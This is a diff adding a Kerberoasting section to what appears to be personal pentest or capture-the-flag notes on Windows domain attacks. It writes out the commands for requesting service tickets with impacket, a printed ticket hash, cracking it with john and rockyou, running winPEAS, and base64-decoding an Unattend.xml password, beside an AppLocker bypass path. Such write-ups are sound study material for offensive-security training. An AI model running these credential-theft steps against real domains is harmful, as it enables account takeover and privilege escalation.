@@ -934,3 +934,39 @@ If AppLocker is configured with default AppLocker rules, we can bypass it by pla
 
 	C:\Windows\System32\spool\drivers\color
  This is whitelisted by default. 
+### Kerberosting
+Find SPN users
+
+	impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.10.90.196 'CORP.local/dark:_QuejVudId6'
+	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+	
+	ServicePrincipalName  Name  MemberOf                                    PasswordLastSet             LastLogon                   Delegation 
+	--------------------  ----  ------------------------------------------  --------------------------  --------------------------  ----------
+	HTTP/fela             fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2019-10-11 05:39:12.562404             
+	HOST/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2019-10-11 05:39:12.562404             
+	HTTP/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2019-10-11 05:39:12.562404             
+
+Look at the file
+
+	cat kerberoastables.txt          
+	$krb5tgs$23$*fela$CORP.LOCAL$CORP.local/fela*$b42eab1730ae3e71b54d2e881afca408$9032a61efcd2be7eb4ecde61e01bfa6a79a1907eab48dcd25869d4f975356c4c844e2517f3d6b2c6d32558f8fa828864b2ddea0be6cfe70b0ec82c59ffb0d5f4e5e8caa83e602d3f359f556e61e9b337cc60bf1aa0098e41ac33f1c195fc1c49d8d351f21...3dc4c24f64264b57705dcee043da7a1758e4
+
+Let's proceed to brute force the ticket (I used john, since I do not have enough memory to run hashcat from the VM I'm worrking at the moment):
+
+	john kerberoastables.txt -format=krb5tgs -wordlist=/usr/share/wordlists/rockyou.txt
+
+ We can connect with the new credentials we found. Since we can run powershell as administrator we can find the flag on the desktop.
+ Then I used winpeas64 to find priv escalation path. Remember to set the color using the following command:
+
+ 	REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+  You need to re-open the DOS shell to see the coloured output running. We found Unattend file credentials:
+
+	╔══════════╣ Unattend Files
+	C:\Windows\Panther\Unattend\Unattended.xml
+	<Password>        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>        <PlainText>false</PlainText>    </Password>
+  
+We can decode the password as follows:
+
+	echo dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ= | base64 --decode
+	
+ 	
